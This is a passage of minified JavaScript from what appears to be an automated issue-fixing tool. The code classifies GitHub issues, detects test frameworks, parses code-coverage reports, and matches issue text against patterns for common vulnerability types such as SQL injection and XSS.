Q=P3(J),Y=[],W="medium",G=/`([\w\-./]+\.[\w]+)`|"([\w\-./]+\.[\w]+)"|'([\w\-./]+\.[\w]+)'|([\w\-./]*\/[\w\-./]*\.(?:js|ts|py|java|rb|php|go|rs|cpp|c|h))/g,H;while((H=G.exec(X))!==null){let K=H[1]||H[2]||H[3]||H[4];if(K&&!Y.includes(K))Y.push(K)}let z=["login.js","auth.js","login.ts","auth.ts","authentication.js","authentication.ts","security.js","security.ts"];for(let K of z)if(X.toLowerCase().includes(K.toLowerCase())&&!Y.includes(K))Y.push(K);if(X.toLowerCase().includes("simple")||X.toLowerCase().includes("straightforward"))W="simple";else if(X.toLowerCase().includes("complex")||X.toLowerCase().includes("challenging"))W="complex";let $="",V=["Suggested Approach:","Approach:","Solution:","Fix:","Recommendation:","To fix this"];for(let K of V)if(X.includes(K)){if($=X.split(K)[1]?.split(`

`)[0]?.trim()||"",$)break}if(!$&&X.length>50)if(X.length>500)$=X.trim();else $=X.split(`

`).filter((Z)=>Z.trim().length>20)[0]?.trim()||"";return U.info(`Parsed analysis for issue #${J.number}:`,{filesToModify:Y,suggestedApproach:$.substring(0,100),canBeFixed:Y.length>0&&$.length>0}),{issueType:Q,filesToModify:Y,estimatedComplexity:W,requiredContext:[],suggestedApproach:$,confidenceScore:0.7,canBeFixed:(Y.length>0||$.length>50)&&$.length>0}}catch(Q){return U.error("Error parsing AI analysis response",Q),{issueType:"other",filesToModify:[],estimatedComplexity:"medium",requiredContext:[],suggestedApproach:"Unable to determine approach from AI analysis.",canBeFixed:!1}}}function Iv1(X){let J=[],Q=/####\s*`([^`]+)`/g,Y;while((Y=Q.exec(X.body))!==null)J.push(Y[1]);return J}function P3(X){let J=X.title.toLowerCase(),Q=X.body.toLowerCase(),Y=`${J} ${Q}`;for(let W of X.labels){if(W.toLowerCase().includes("bug"))return"bug";if(W.toLowerCase().includes("feature"))return"feature";if(W.toLowerCase().includes("refactor"))return"refactoring";if(W.toLowerCase().includes("performance"))return"performance";if(W.toLowerCase().includes("security"))return"security";if(W.toLowerCase().includes("documentation"))return"documentation";if(W.toLowerCase().includes("dependency"))return"dependency";if(W.toLowerCase().includes("test"))return"test"}if(Y.includes("fix")||Y.includes("bug")||Y.includes("issue")||Y.includes("crash")||Y.includes("error"))return"bug";else if(Y.includes("add")||Y.includes("new")||Y.includes("feature")||Y.includes("implement"))return"feature";else if(Y.includes("refactor")||Y.includes("clean")||Y.includes("improve code"))return"refactoring";else if(Y.includes("performance")||Y.includes("slow")||Y.includes("optimize")||Y.includes("speed"))return"performance";else if(Y.includes("secur")||Y.includes("vulnerab")||Y.includes("hack")||Y.includes("attack"))return"security";else if(Y.includes("document")||Y.includes("readme")||Y.includes("wiki")||Y.includes("comment"))return"documentation";else if(Y.includes("dependency")||Y.includes("upgrade")||Y.includes("update")||Y.includes("package"))return"dependency";else if(Y.includes("test")||Y.includes("spec")||Y.includes("unit test")||Y.includes("coverage"))return"test";return"other"}var WJ=s(()=>{I1();_7()});var HR=s(()=>{P7();k8();F2();P7();TX()});class E7{securityDetector;constructor(){let X=C6();this.securityDetector=new nX(X)}async analyzeWithSecurity(X,J,Q,Y){U.info(`Analyzing issue #${X.number} with security-aware analysis`);let W=await this.performStandardAnalysis(X,J,Y),G;if(Q&&Q.size>0){if(G=await this.performSecurityAnalysis(Q,X),G.hasSecurityIssues)W.issueType="security",W.estimatedComplexity=this.adjustComplexityForSecurity(W.estimatedComplexity,G.riskLevel)}return{...W,securityAnalysis:G}}async performSecurityAnalysis(X,J){U.info("=== SECURITY ANALYSIS v2.0 ACTIVE ==="),U.info(`Performing security analysis on ${X.size} codebase files`);let Q=[],Y=[];for(let[z,$]of X.entries()){let V=this.getLanguageFromPath(z);if(!V){U.debug(`Skipping file ${z} - unable to determine language`);continue}let K=await this.securityDetector.detect($,V,z);if(K.length>0){let Z=K.map((q)=>({...q,file:z}));Q.push(...Z),Y.push(z),U.info(`Found ${K.length} vulnerabilities in ${z}`)}}let W=this.calculateRiskLevel(Q),G=this.generateSecurityRecommendations(Q),H={total:Q.length,byType:{},bySeverity:{}};return Q.forEach((z)=>{H.byType[z.type]=(H.byType[z.type]||0)+1,H.bySeverity[z.severity]=(H.bySeverity[z.severity]||0)+1}),{hasSecurityIssues:Q.length>0,vulnerabilities:Q,riskLevel:W,recommendations:G,affectedFiles:Y,summary:H}}getLanguageFromPath(X){switch(X.split(".").pop()?.toLowerCase()){case"js":case"jsx":return"javascript";case"ts":case"tsx":return"typescript";case"py":return"python";case"rb":return"ruby";case"php":return"php";case"java":return"java";case"rs":return"rust";case"ex":case"exs":return"elixir";default:return null}}calculateRiskLevel(X){if(X.length===0)return"low";let J=X.filter((W)=>W.severity==="critical").length,Q=X.filter((W)=>W.severity==="high").length,Y=X.filter((W)=>W.severity==="medium").length;if(J>0)return"critical";if(Q>=3)return"critical";if(Q>=1)return"high";if(Y>=3)return"high";if(Y>=1)return"medium";return"low"}generateSecurityRecommendations(X){let J=new Set;for(let Q of X){if(Q.remediation)J.add(Q.remediation);switch(Q.type){case"sql_injection":J.add("Implement parameterized queries throughout the codebase"),J.add("Add input validation and sanitization");break;case"xss":J.add("Use secure DOM manipulation methods (textContent, not innerHTML)"),J.add("Implement Content Security Policy (CSP)");break;default:J.add("Review security best practices for this vulnerability type")}}return Array.from(J)}adjustComplexityForSecurity(X,J){if(J==="critical")return"complex";if(J==="high"&&X==="simple")return"medium";if(J==="high"&&X==="medium")return"complex";return X}async performStandardAnalysis(X,J,Q){let{analyzeIssue:Y}=await Promise.resolve().then(() => (WJ(),GR));return await Y(X,J,Q)}determineIssueType(X){let J=X.title.toLowerCase(),Q=X.body.toLowerCase(),Y=`${J} ${Q}`;if(Y.includes("secur")||Y.includes("vulnerab")||Y.includes("hack")||Y.includes("attack")||Y.includes("xss")||Y.includes("sql injection"))return"security";if(Y.includes("fix")||Y.includes("bug"))return"bug";else if(Y.includes("add")||Y.includes("feature"))return"feature";else if(Y.includes("refactor"))return"refactoring";else if(Y.includes("performance"))return"performance";return"other"}}var S3=s(()=>{I1();HR();P7();k8()});import*as T9 from"fs";import*as GJ from"path";class T3{async detectFromPackageJson(X){if(!X)return{detected:!1,frameworks:[]};let J=[],Q={...X.dependencies,...X.devDependencies};for(let[Y,W]of Object.entries(Cv1))for(let G of W.patterns){let H=Object.keys(Q).find((z)=>z.includes(G));if(H){let z=Q[H],$=this.detectVersionType(z),V={name:Y,version:z,type:W.type,confidence:1,detectionMethod:"package",versionType:$};if("companions"in W&&W.companions){let K=W.companions.filter((Z)=>Object.keys(Q).some((q)=>q.includes(Z)));if(K.length>0)V.companions=K}J.push(V);break}}return{detected:J.length>0,frameworks:J}}async detectFromRequirements(X){if(!X)return{detected:!1,frameworks:[]};let J=[],Q=X.split(`
`);for(let[Y,W]of Object.entries(Pv1))if("patterns"in W&&W.patterns)for(let G of W.patterns){let H=Q.find((z)=>z.startsWith(G));if(H){let z=H.includes("==")?H.split("==")[1].trim():"unknown",$={name:Y,version:z,type:W.type,confidence:1,detectionMethod:"package"};if("plugins"in W&&W.plugins){let V=W.plugins.filter((K)=>Q.some((Z)=>Z.startsWith(K)));if(V.length>0)$.plugins=V}J.push($);break}}return{detected:J.length>0,frameworks:J}}async detectFromGemfile(X){if(!X)return{detected:!1,frameworks:[]};let J=[],Q=X.split(`
`);for(let[Y,W]of Object.entries(Sv1))for(let G of W.patterns){let H=Q.find((z)=>z.includes(`gem '${G}`)||z.includes(`gem "${G}`));if(H){let z=H.match(/['"]([^'"]+)['"]\s*,\s*['"]([^'"]+)['"]/),$=z?z[2]:"unknown",V={name:Y,version:$,type:W.type,confidence:1,detectionMethod:"package"};if("variants"in W&&W.variants){let K=W.variants.find((Z)=>Q.some((q)=>q.includes(`gem '${Z}'`)||q.includes(`gem "${Z}"`)));if(K)V.variant=K}J.push(V);break}}return{detected:J.length>0,frameworks:J}}async detectFromSourceCode(X,J){let Q=[];if(J==="python"){if(X.includes("import unittest")||X.includes("from unittest"))Q.push({name:"unittest",version:"builtin",type:"unit",confidence:0.9,detectionMethod:"import"})}return{detected:Q.length>0,frameworks:Q}}async detectFromFilePatterns(X){let J=[];if(X.some((W)=>W.includes(".test.")||W.includes(".spec.")||W.includes("__tests__")))J.push({name:"jest",version:"unknown",type:"unit",confidence:0.7,detectionMethod:"file-pattern"});if(X.some((W)=>W.includes("_spec.rb")||W.includes("spec_helper.rb")||W.includes("/spec/")))J.push({name:"rspec",version:"unknown",type:"unit",confidence:0.8,detectionMethod:"file-pattern"});return{detected:J.length>0,frameworks:J}}async detectFromConfigFiles(X){let J=[];for(let Q of X)if(Q.includes("jest.config"))J.push({name:"jest",version:"unknown",type:"unit",confidence:0.95,configFile:Q,detectionMethod:"config"});else if(Q.includes("vitest.config"))J.push({name:"vitest",version:"unknown",type:"unit",confidence:0.95,configFile:Q,detectionMethod:"config"});return{detected:J.length>0,frameworks:J}}async detectFrameworks(X){let J=[],Q=[],Y=[];try{let G=GJ.join(X,"package.json");if(T9.existsSync(G)){let K=JSON.parse(T9.readFileSync(G,"utf-8")),Z=await this.detectFromPackageJson(K);J.push(...Z.frameworks)}let H=GJ.join(X,"requirements.txt");if(T9.existsSync(H)){let K=T9.readFileSync(H,"utf-8"),Z=await this.detectFromRequirements(K);J.push(...Z.frameworks)}let z=GJ.join(X,"Gemfile");if(T9.existsSync(z)){let K=T9.readFileSync(z,"utf-8"),Z=await this.detectFromGemfile(K);J.push(...Z.frameworks)}let $=["test","tests","__tests__","spec","specs"];for(let K of $){let Z=GJ.join(X,K);if(T9.existsSync(Z)&&T9.statSync(Z).isDirectory())Y.push(K)}Q.push("*.test.js","*.test.ts","*.spec.js","*.spec.ts","*_test.py","test_*.py","*_spec.rb","*.test.go");let V=GJ.join(X,"bunfig.toml");if(T9.existsSync(V))J.push({name:"bun",version:"builtin",type:"unit",confidence:1,detectionMethod:"config",configFile:"bunfig.toml"})}catch(G){}let W=J.reduce((G,H)=>!G||H.confidence>G.confidence?H:G,null)||void 0;return{detected:J.length>0,primaryFramework:W,allFrameworks:J,testFilePatterns:Q,testDirectories:Y}}detectVersionType(X){if(X.startsWith("^"))return"caret";if(X.startsWith("~"))return"tilde";if(X.includes(">")||X.includes("<")||X.includes(" "))return"range";return"exact"}}var Cv1,Pv1,Sv1;var zR=s(()=>{Cv1={jest:{type:"unit",patterns:["jest"]},vitest:{type:"unit",patterns:["vitest","@vitest/"]},mocha:{type:"unit",patterns:["mocha"],companions:["chai","sinon"]},jasmine:{type:"unit",patterns:["jasmine"]},cypress:{type:"e2e",patterns:["cypress"]},playwright:{type:"e2e",patterns:["@playwright/test","playwright"]},ava:{type:"unit",patterns:["ava"]},tape:{type:"unit",patterns:["tape"]},qunit:{type:"unit",patterns:["qunit"]},bun:{type:"unit",patterns:["bun:test"]},karma:{type:"unit",patterns:["karma"]},"testing-library":{type:"unit",patterns:["@testing-library/"]}},Pv1={pytest:{type:"unit",patterns:["pytest"],plugins:["pytest-cov","pytest-mock"]},unittest:{type:"unit",builtin:!0},nose2:{type:"unit",patterns:["nose2"]},doctest:{type:"unit",builtin:!0},hypothesis:{type:"unit",patterns:["hypothesis"]}},Sv1={rspec:{type:"unit",patterns:["rspec"],variants:["rspec-rails"]},minitest:{type:"unit",patterns:["minitest"]},"test-unit":{type:"unit",patterns:["test-unit"]},cucumber:{type:"bdd",patterns:["cucumber"]},capybara:{type:"e2e",patterns:["capybara"]}}});class _3{async parseLcov(X){try{let J=[],Q=X.split("end_of_record").filter((W)=>W.trim());for(let W of Q){let G=W.split(`
`).filter((z)=>z.trim()),H={functions:{total:0,covered:0,details:[]},lines:{total:0,covered:0,percentage:0,details:[]}};for(let z of G){let[$,...V]=z.split(":"),K=V.join(":");switch($){case"SF":H.path=K;break;case"FN":let[Z,q]=K.split(",");H.functions.details.push({name:q,line:parseInt(Z),hits:0});break;case"FNF":H.functions.total=parseInt(K);break;case"FNH":H.functions.covered=parseInt(K);break;case"DA":let[B,M]=K.split(","),O=parseInt(B),R=parseInt(M);if(H.lines.details.push({line:O,hits:R}),R===0&&!H.lines.uncoveredLines)H.lines.uncoveredLines=[];if(R===0)H.lines.uncoveredLines.push(O);break;case"LF":H.lines.total=parseInt(K);break;case"LH":H.lines.covered=parseInt(K);break}}if(H.lines.total>0)H.lines.percentage=parseFloat((H.lines.covered/H.lines.total*100).toFixed(2));if(H.functions?.details){for(let z of H.functions.details){let $=H.lines.details.find((V)=>V.line===z.line);if($)z.hits=$.hits}if(H.functions.total>0)H.functions.percentage=parseFloat((H.functions.covered/H.functions.total*100).toFixed(2))}if(H.path)J.push(H)}let Y=this.calculateSummary(J);return{format:"lcov",files:J,summary:Y}}catch(J){return{format:"lcov",files:[],error:`Failed to parse LCOV data: ${J}`,summary:{totalFiles:0,totalLines:0,coveredLines:0,linePercentage:0}}}}async parseCoveragePy(X){try{let J=JSON.parse(X),Q=[];for(let[Y,W]of Object.entries(J.files)){let G=W;Q.push({path:Y,lines:{total:G.summary.num_statements,covered:G.summary.covered_lines,percentage:G.summary.percent_covered,uncoveredLines:G.missing_lines}})}return{format:"coverage.py",files:Q,summary:{totalFiles:Q.length,totalLines:J.totals.num_statements,coveredLines:J.totals.covered_lines,linePercentage:J.totals.percent_covered}}}catch(J){return{format:"coverage.py",files:[],error:`Failed to parse coverage.py data: ${J}`}}}async parseCoveragePyXml(X){try{let J=[],Q=X.matchAll(/<class filename="([^"]+)"[^>]*>([\s\S]*?)<\/class>/g);for(let Y of Q){let W=Y[1],H=Y[2].matchAll(/<line number="(\d+)" hits="(\d+)"/g),z=[],$=[];for(let Z of H){let q=parseInt(Z[1]),B=parseInt(Z[2]);if(z.push({line:q,hits:B}),B===0)$.push(q)}let V=z.filter((Z)=>Z.hits>0).length,K=z.length;J.push({path:W,lines:{total:K,covered:V,percentage:K>0?parseFloat((V/K*100).toFixed(2)):0,details:z,uncoveredLines:$}})}return{format:"coverage.py-xml",files:J,summary:this.calculateSummary(J)}}catch(J){return{format:"coverage.py-xml",files:[],error:`Failed to parse coverage.py XML: ${J}`}}}async parseSimpleCov(X){try{let J=JSON.parse(X),Q=[],W=Object.values(J)[0].coverage;if(!W)throw Error("Invalid SimpleCov format: missing coverage data");for(let[G,H]of Object.entries(W)){let z=H,$=z.lines||z,K=(Array.isArray($)?$:[]).map((B,M)=>({line:M+1,hits:B})).filter((B)=>B.hits!==null),Z=K.filter((B)=>B.hits>0),q=K.filter((B)=>B.hits===0).map((B)=>B.line);Q.push({path:G,lines:{total:K.length,covered:Z.length,percentage:K.length>0?parseFloat((Z.length/K.length*100).toFixed(2)):0,uncoveredLines:q}})}return{format:"simplecov",files:Q,summary:this.calculateSummary(Q)}}catch(J){return{format:"simplecov",files:[],error:`Failed to parse SimpleCov data: ${J}`}}}async findCoverageGaps(X){let J=[];for(let Q of X.files){if(Q.functions?.details){for(let Y of Q.functions.details)if(Y.hits===0)J.push({file:Q.path,type:"uncovered-function",name:Y.name,line:Y.line,priority:this.getPriority(Q.path,"function")})}if(Q.lines.uncoveredLines&&Q.lines.uncoveredLines.length>0){let Y=this.findUncoveredBlocks(Q.lines.uncoveredLines);for(let W of Y)J.push({file:Q.path,type:"uncovered-block",lines:W,priority:this.getPriority(Q.path,"block",W.length)});if(Q.lines.uncoveredLines.length>=5&&this.isSecurityFile(Q.path))J.push({file:Q.path,type:"uncovered-block",lines:Q.lines.uncoveredLines.slice(0,5),priority:"critical"})}if(Q.lines.percentage<50)J.push({file:Q.path,type:"low-coverage",coveragePercentage:Q.lines.percentage,priority:this.getPriority(Q.path,"file",void 0,Q.lines.percentage)})}return J}async findTestsForFile(X,J){let Q=this.getBaseName(X),Y=J.filter((W)=>{return this.getBaseName(W).includes(Q)||W.includes(X.replace(/\.[^.]+$/,""))});return{sourceFile:X,testFiles:Y,hasTests:Y.length>0}}async mapTestsToSource(X,J){let Q={};for(let Y of X)Q[Y]=await this.findTestsForFile(Y,J);return Q}async generateSummary(X){let J=X.files.filter((Y)=>Y.lines.percentage<80).map((Y)=>Y.path),Q=X.files.filter((Y)=>Y.lines.percentage>=80).map((Y)=>Y.path);return{overallCoverage:X.summary?.linePercentage||0,filesCovered:X.files.length,linesOfCode:X.summary?.totalLines||0,linesCovered:X.summary?.coveredLines||0,functionsCovered:X.summary?.coveredFunctions,totalFunctions:X.summary?.totalFunctions,needsImprovement:J,wellCovered:Q}}async recommendTestPriorities(X){let J=[],Q=[...X].sort((W,G)=>{let H={critical:0,high:1,medium:2,low:3};return H[W.priority]-H[G.priority]}),Y=1;for(let W of Q){let G=this.getRecommendationReason(W),H=this.getSuggestedTests(W);J.push({priority:Y++,file:W.file,reason:G,suggestedTests:H,coverageGap:W})}return J}async getTestGenerationContext(X,J){let Q=X.files.find((G)=>G.path===J);if(!Q)throw Error(`File ${J} not found in coverage report`);let Y=Q.functions?.details?.filter((G)=>G.hits===0).map((G)=>G.name)||[],W=this.getPriority(J,"file",void 0,Q.lines.percentage);return{file:J,uncoveredFunctions:Y,uncoveredLines:Q.lines.uncoveredLines||[],coveragePercentage:Q.lines.percentage,priority:W,suggestedTestTypes:this.getSuggestedTestTypes(Q,W)}}calculateSummary(X){let J=0,Q=0,Y=0,W=0;for(let G of X)if(J+=G.lines.total,Q+=G.lines.covered,G.functions)Y+=G.functions.total,W+=G.functions.covered;return{totalFiles:X.length,totalLines:J,coveredLines:Q,linePercentage:J>0?parseFloat((Q/J*100).toFixed(2)):0,totalFunctions:Y||void 0,coveredFunctions:W||void 0,functionPercentage:Y>0?parseFloat((W/Y*100).toFixed(2)):void 0}}findUncoveredBlocks(X){if(X.length===0)return[];let J=[],Q=[X[0]];for(let Y=1;Y<X.length;Y++)if(X[Y]===X[Y-1]+1)Q.push(X[Y]);else{if(Q.length>=1)J.push([...Q]);Q=[X[Y]]}if(Q.length>=1)J.push(Q);return J}getPriority(X,J,Q,Y){if(this.isSecurityFile(X)){if(J==="file")return"critical";if(J==="function"&&Y===0)return"critical";return J==="function"||J==="block"&&Q&&Q>=3?"critical":"high"}if(J==="function")return"high";if(J==="block"&&Q&&Q>10)return"high";if(J==="file"&&Y!==void 0&&Y<30)return"high";return"medium"}isSecurityFile(X){return["auth","crypto","security","password","token","session","validat"].some((Q)=>X.toLowerCase().includes(Q))}getBaseName(X){let J=X.split("/");return J[J.length-1].replace(/\.(test|spec|tests?)\..*$/,"").replace(/\.[^.]+$/,"")}getRecommendationReason(X){switch(X.type){case"uncovered-function":return X.priority==="critical"?"Critical security function lacks coverage":`Function ${X.name} has no test coverage`;case"uncovered-block":return`Code block (${X.lines?.length} lines) lacks coverage`;case"low-coverage":return`File has only ${X.coveragePercentage}% coverage`;default:return"Insufficient test coverage"}}getSuggestedTests(X){let J=[];switch(X.type){case"uncovered-function":if(J.push("Unit test for function behavior"),J.push("Edge case tests"),X.priority==="critical")J.push("Security validation tests"),J.push("Error handling tests");break;case"uncovered-block":J.push("Branch coverage tests"),J.push("Conditional logic tests");break;case"low-coverage":J.push("Comprehensive unit tests"),J.push("Integration tests");break}return J}getSuggestedTestTypes(X,J){let Q=["unit"];if(X.path.includes("valid"))Q.push("validation","edge-cases");if(J==="critical")Q.push("security","error-handling");if(X.lines.percentage===0)Q.unshift("basic-functionality");return Q}}class E3{vulnerabilityPatterns={"sql-injection":[/sql\s*injection/i,/sqli\b/i,/concatenat\w*\s+.*\s*(sql|query)/i,/string\s+concatenation.*query/i,/unsanitized.*sql/i,/parameterized\s+quer/i],xss:[/cross[\s-]*site[\s-]*scripting/i,/\bxss\b/i,/unescaped\s+(html|user|data|input)/i,/html\s+entit/i,/script\s+injection/i,/<%=.*%>/],"path-traversal":[/path\s+traversal/i,/directory\s+traversal/i,/\.\.\/|\.\.\\+/g,/file\s+path.*validation/i],"command-injection":[/command\s+injection/i,/shell\s+injection/i,/os\s+command/i,/exec\(/i,/system\(/i],injection:[/injection/i,/A03:2021/],rce:[/remote\s+code\s+execution/i,/\brce\b/i,/arbitrary\s+code/i]};severityIndicators={critical:[/critical/i,/severe/i,/emergency/i,/immediate/i,/cvss.*[89]\.\d/i,/remote\s+code\s+execution/i],high:[/high/i,/important/i,/major/i,/urgent/i,/cvss.*[67]\.\d/i],medium:[/medium/i,/moderate/i,/cvss.*[45]\.\d/i],low:[/low/i,/minor/i,/informational/i,/cvss.*[0-3]\.\d/i]};testFrameworkPatterns={jest:/\bjest\b/i,mocha:/\bmocha\b/i,jasmine:/\bjasmine\b/i,cypress:/\bcypress\b/i,playwright:/\bplaywright\b/i,vitest:/\bvitest\b/i,pytest:/\bpytest\b/i,unittest:/\bunittest\b/i,rspec:/\brspec\b/i,minitest:/\bminitest\b/i,phpunit:/\bphpunit\b/i,junit:/\bjunit\b/i,exunit:/\bexunit\b/i};async interpretIssue(X){let J=await this.interpret(X.body),Q=this.extractFromTitle(X.title);if(Q.vulnerabilityType&&!J.vulnerabilityType)J.vulnerabilityType=Q.vulnerabilityType;if(Q.severity)J.severity=Q.severity;if(X.labels)for(let Y of X.labels){if(Y.toLowerCase()==="security")J.category="security",J.isSecurityIssue=!0;if(this.severityIndicators.critical.some((W)=>W.test(Y)))J.severity="critical";if(Y.includes("sql-injection"))J.vulnerabilityType="sql-injection",J.confidence=Math.max(J.confidence,0.95)}return J}async interpret(X){if(!X||X.trim()==="")return this.createEmptyResult();let J={vulnerabilityType:"unknown",confidence:0,affectedFiles:[],affectedFunctions:[],affectedLines:[],affectedLocations:[],keywords:[],codeSnippets:[],testFrameworks:[],testFiles:[],fixSuggestions:[]},Q=this.checkIfSecurityIssue(X);J.isSecurityIssue=Q.isSecurity,J.issueType=Q.issueType;let Y=this.extractVulnerabilityType(X);J.vulnerabilityType=Y.type,J.confidence=Y.confidence,J.keywords=Y.keywords,J.multipleVulnerabilities=Y.multiple,J.severity=this.extractSeverity(X),J.urgency=this.mapSeverityToUrgency(J.severity);let W=this.extractAffectedLocations(X);J.affectedFiles=W.files,J.affectedFunctions=W.functions,J.affectedLines=W.lines,J.affectedLocations=W.locations,J.codeSnippets=this.extractCodeSnippets(X);let G=this.extractFunctionsFromCode(J.codeSnippets);J.affectedFunctions=[...new Set([...J.affectedFunctions,...G])];let H=this.extractTestInformation(X);J.testFrameworks=H.frameworks,J.testFiles=H.files,J.suggestedTestStrategy=H.strategy;let z=this.extractFixInformation(X);J.fixSuggestions=z.suggestions,J.fixExample=z.example,J.suggestedPatterns=this.suggestPatterns(J.vulnerabilityType,X);let $=this.extractMetadata(X);return Object.assign(J,$),J.references=this.extractReferences(X),J.todoItems=this.extractTodoItems(X),J}createEmptyResult(){return{vulnerabilityType:"unknown",confidence:0,needsMoreInfo:!0,affectedFiles:[],affectedFunctions:[],affectedLines:[],affectedLocations:[],keywords:[],codeSnippets:[],testFrameworks:[],testFiles:[],fixSuggestions:[]}}checkIfSecurityIssue(X){let J=X.toLowerCase();if(J.includes("feature request")||J.includes("enhancement"))return{isSecurity:!1,issueType:"feature-request"};if(J.includes("documentation")||J.includes("docs"))return{isSecurity:!1,issueType:"documentation"};let Y=["security","vulnerability","exploit","injection","xss","csrf","authentication","authorization","encryption","attack","malicious","cve-","cwe-","owasp","sensitive","logs","debug"].some((W)=>J.includes(W));return{isSecurity:Y,issueType:Y?"security":"other"}}extractVulnerabilityType(X){let J=[];for(let[Y,W]of Object.entries(this.vulnerabilityPatterns)){let G=0,H=[];for(let z of W){let $=X.match(z);if($)G++,H.push($[0])}if(G>0)J.push({type:Y,confidence:Math.min(0.5+G*0.25,1),keywords:H})}if(X.match(/multiple\s+(security\s+)?issues/i)){let Y=this.extractMultipleVulnerabilities(X);if(Y.length>1)return{type:"multiple",confidence:0.9,keywords:J.flatMap((W)=>W.keywords),multiple:Y}}if(J.length>0)return J.sort((Y,W)=>W.confidence-Y.confidence),J[0];return{type:"unknown",confidence:0,keywords:[]}}extractMultipleVulnerabilities(X){let J=[],Q=X.split(/\d+\./g).slice(1);for(let Y of Q){let W=Y.trim().split(`
`).filter((Z)=>Z.trim());if(W.length===0)continue;let G=W[0],H=G.match(/(.+?)\s+in\s+(.+)/),z="",$="";if(H)z=this.normalizeVulnerabilityType(H[1]),$=H[2].trim();else z=this.normalizeVulnerabilityType(G);let V=$,K="";for(let Z of W.slice(1)){let q=Z.trim();if(q.includes("File:"))V=q.replace(/^-\s*File:\s*/,"").trim();else if(q.startsWith("-")&&!q.includes("File:"))K=q.replace(/^-\s*/,"").trim()}J.push({type:z,file:V||void 0,description:K||void 0})}return J}normalizeVulnerabilityType(X){let J=X.toLowerCase().trim();if(J.includes("sql injection"))return"sql-injection";if(J.includes("xss")||J.includes("cross-site scripting"))return"xss";if(J.includes("path traversal"))return"path-traversal";if(J.includes("command injection"))return"command-injection";return J.replace(/\s+/g,"-")}extractSeverity(X){let J=X.match(/cvss\s*(?:score)?[:\s]+(\d+\.?\d*)/i);if(J){let Q=parseFloat(J[1]);if(Q>=9)return"critical";if(Q>=7)return"high";if(Q>=4)return"medium";return"low"}for(let[Q,Y]of Object.entries(this.severityIndicators))if(Y.some((W)=>W.test(X)))return Q;return}mapSeverityToUrgency(X){switch(X){case"critical":return"immediate";case"high":return"urgent";case"medium":return"planned";case"low":return"planned";case"info":return"backlog";default:return}}extractAffectedLocations(X){let J=[],Q=[],Y=[],W=[],G=X.split(`
`);for(let V of G){if(!V.trim())continue;let K=V.match(/^\s*-\s+([^\s(]+\.[a-zA-Z]+)\s*\(line\s+(\d+)\s*-\s*(\d+)\s*\)/i);if(K){let F=K[1];if(!J.includes(F)){J.push(F);let T={file:F,lines:[]},b=parseInt(K[2]),h=parseInt(K[3]);for(let L=b;L<=h;L++)T.lines.push(L);W.push(T)}continue}let Z=V.match(/^\s*-\s+([^\s:]+\.[a-zA-Z]+):(\d+)/i);if(Z){let F=Z[1];if(!J.includes(F))J.push(F),W.push({file:F,lines:[parseInt(Z[2])]});continue}let q=V.match(/(?:\*\*File\*\*|\bFile):\s*([^\s,]+\.[a-zA-Z]+)(?:,?\s*(?:\*\*Function\*\*|Function):\s*(\w+))?/i);if(q){let F=q[1];if(!J.includes(F)){J.push(F);let T={file:F};if(q[2])T.function=q[2];W.push(T)}continue}let B=V.match(/^\s*-\s*`([^`]+\.[a-zA-Z]+)`\s*-\s*(\w+)\s+function/i);if(B){let F=B[1];if(!J.includes(F))J.push(F),W.push({file:F,function:B[2]});continue}let M=V.match(/^\s*-\s+([^\s]+\.[a-zA-Z]+)\s*$/i);if(M){let F=M[1];if(!J.includes(F))J.push(F),W.push({file:F});continue}let O=V.match(/\*\*([^\*]+\.[a-zA-Z]+)\*\*/i);if(O){let F=O[1];if(!J.includes(F))J.push(F),W.push({file:F})}let R=V.match(/^\s*-\s*\*\*Function\*\*:\s*(\w+)\s*\(lines?\s+(\d+)\s*-\s*(\d+)\s*\)/i);if(R&&W.length>0){let F=W[W.length-1];F.function=R[1],F.lines=[];let T=parseInt(R[2]),b=parseInt(R[3]);for(let h=T;h<=b;h++)F.lines.push(h);if(!Q.includes(R[1]))Q.push(R[1])}let I=V.match(/^\s*-\s*\*\*Endpoint\*\*:\s*(.+)$/i);if(I&&W.length>0){let F=W[W.length-1];F.endpoint=I[1].trim()}}let H=[/\bline[s]?[:\s]+(\d+)(?:\s*-\s*(\d+))?/gi,/:(\d+)\b/g,/\(line[s]?\s+(\d+)(?:\s*-\s*(\d+))?\)/gi];for(let V of H){let K;while((K=V.exec(X))!==null){let Z=parseInt(K[1]);if(!Y.includes(Z))Y.push(Z);if(K[2]){let q=parseInt(K[2]);for(let B=Z+1;B<=q;B++)if(!Y.includes(B))Y.push(B)}}}let z=[/(?:Function|function):\s*(\w+)/g,/\bfunction\s+(\w+)/g,/\bdef\s+(\w+)/g,/`(\w+)\(\)`/g,/\bThe\s+`(\w+)\(\)`\s+function/gi];for(let V of z){let K;while((K=V.exec(X))!==null){let Z=K[1];if(!Q.includes(Z)&&Z.length>2&&!this.isCommonWord(Z))Q.push(Z)}}let $=X.match(/(?:endpoint|route|api):\s*([^\n]+)/i);if($&&W.length>0)W[0].endpoint=$[1].trim();return{files:[...new Set(J)],functions:[...new Set(Q)],lines:[...new Set(Y)].sort((V,K)=>V-K),locations:W}}isCommonWord(X){return["the","and","for","with","from","this","that","where","when"].includes(X.toLowerCase())}extractCodeSnippets(X){let J=[],Q=/```(\w+)?\n([\s\S]*?)```/g,Y;while((Y=Q.exec(X))!==null){let W=Y[1]||"unknown",G=Y[2].trim();J.push({language:W,code:G,vulnerableLines:this.identifyVulnerableLines(G,W)})}return J}identifyVulnerableLines(X,J){let Q=[];return X.split(`
`).forEach((W,G)=>{if(W.match(/["'`].*\+.*["'`].*(?:SELECT|INSERT|UPDATE|DELETE)/i))Q.push(G+1);if(W.match(/<%=/)||W.match(/innerHTML\s*=/)||W.match(/v-html/))Q.push(G+1);if(W.match(/exec\(|system\(|eval\(/))Q.push(G+1)}),Q}extractFunctionsFromCode(X){let J=[];for(let Q of X){let Y=[/function\s+(\w+)/g,/(\w+)\s*:\s*(?:async\s+)?function/g,/(\w+)\s*=\s*(?:async\s+)?function/g,/(\w+)\s*=\s*(?:async\s+)?\([^)]*\)\s*=>/g,/def\s+(\w+)/g,/public\s+function\s+(\w+)/g];for(let W of Y){let G;while((G=W.exec(Q.code))!==null)if(!J.includes(G[1]))J.push(G[1])}}return J}extractTestInformation(X){let J=[],Q=[];for(let[z,$]of Object.entries(this.testFrameworkPatterns)){let V=X.match(new RegExp(`([^.!?
]*${$.source}[^.!?
